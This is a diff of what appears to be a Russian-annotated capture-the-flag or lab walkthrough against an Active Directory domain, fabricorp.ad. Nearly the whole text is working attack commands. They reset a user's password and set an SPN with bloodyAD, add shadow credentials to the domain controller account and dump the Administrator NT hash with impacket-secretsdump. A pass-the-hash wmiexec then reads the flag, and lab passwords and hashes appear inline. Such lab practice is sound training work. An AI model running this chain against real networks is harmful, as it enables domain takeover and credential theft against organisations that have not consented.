@@ -121,12 +121,19 @@ bloodyAD --host DC05.fabricorp.ad -d fabricorp.ad -u 'harry@mssp.ad' -p 'Test@12
 
  proxychains bloodyAD -d mssp.ad -u 'harry' -p 'Test@1234!' --host DC05.fabricorp.ad --dc-ip 172.16.114.20 set object ALEX servicePrincipalName -v 'HTTP/alex.fabricorp.ad'
 proxychains bloodyAD -d mssp.ad -u 'harry' -p 'Test@1234!' --host DC05.fabricorp.ad --dc-ip 172.16.114.20 set password ALEX 'Test@1234!'
+
+сбрасываем пароль
+
 proxychains nxc ldap 172.16.114.20 -d fabricorp.ad -u ALEX -p 'Test@1234!' --users
+
+эта комндда создаст shados credentials
 
 proxychains bloodyAD -d fabricorp.ad -u ALEX -p 'Test@1234!' --host DC05.fabricorp.ad --dc-ip 172.16.114.20 add shadowCredentials 'DC05$'
 
 NT: 4b61e8dc1702261873c1775480ac1a0f
 
+получаем хеш админа
 proxychains impacket-secretsdump -hashes :4b61e8dc1702261873c1775480ac1a0f 'fabricorp.ad/DC05$@172.16.114.20' -just-dc-user Administrator
 
+проверяем
 proxychains impacket-wmiexec -hashes :288d7f5ef7d82e5fabc5227e99faa5c6 'fabricorp.ad/Administrator@172.16.114.20' 'type C:\Users\Administrator\Desktop\flag.txt'
